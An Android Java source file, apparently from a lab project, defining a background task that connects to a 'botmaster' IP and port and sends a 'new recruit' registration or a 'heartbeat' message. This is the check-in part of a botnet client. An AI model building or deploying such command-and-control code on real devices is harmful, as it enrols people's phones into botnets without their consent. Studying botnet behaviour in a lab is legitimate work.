package helloworld.rolen4lab.lan;

import android.os.AsyncTask;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;

public class transmit extends AsyncTask<String, Void, String> {

    @Override
    protected String doInBackground(String... strings) {
        //String botmaster = strings[];
        String result = "fail";
        String botmaster_ip = strings[0];
        int botmaster_port = Integer.parseInt(strings[1]); /* convert port number from string to integer */
        String botmaster_type = strings[2];
        String botmaster_message = strings[3];
        String botmaster_myname = strings[4];
        String message = botmaster_myname;
        DataOutputStream dos;
        PrintWriter pw = null;
        Socket s1;
        try {
            //s1 = new Socket("192.168.1.8", 9999);
            s1 = new Socket(botmaster_ip,botmaster_port);
            pw = new PrintWriter(s1.getOutputStream());
            if(botmaster_type == "1"){
                message = "new recruit" + botmaster_myname + " " + botmaster_message;
                result = "new bot";
            } else {
                message = "heartbeat" + botmaster_myname;
                result = "heartbeat";
            }
            pw.write(message);
            pw.flush();
            pw.close();
            s1.close();
        } catch (IOException ex){
            ex.printStackTrace();
        }
        return result;
    }
}
